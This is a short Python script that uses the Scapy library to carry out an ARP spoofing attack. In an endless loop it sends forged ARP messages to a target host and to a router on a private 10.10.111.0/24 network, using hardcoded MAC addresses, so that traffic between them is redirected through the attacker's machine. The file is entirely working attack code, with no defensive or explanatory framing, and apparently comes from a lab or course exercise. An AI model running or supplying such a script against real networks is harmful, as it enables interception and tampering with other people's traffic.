import sys
from scapy.all import *
import time

def main():
    src_mac = '02:00:8b:46:09:01'   # Source MAC Address
    rtr_mac = '02:00:8b:62:0b:02'   # Router MAC Address
    vic_mac = '02:00:8b:7e:0d:01'   # Target MAC Address
    
    # ARP Spoofing Attack
    while True:
        sendp(Ether(dst=vic_mac)/ARP(psrc = "10.10.111.1", hwsrc=src_mac, pdst="10.10.111.110/24")) # Send ARP Message to Target
        sendp(Ether(dst=rtr_mac)/ARP(psrc = "10.10.111.110", hwsrc=src_mac, pdst="10.10.111.1/24")) # Send ARP Message to Router

if __name__ == '__main__':
    main()
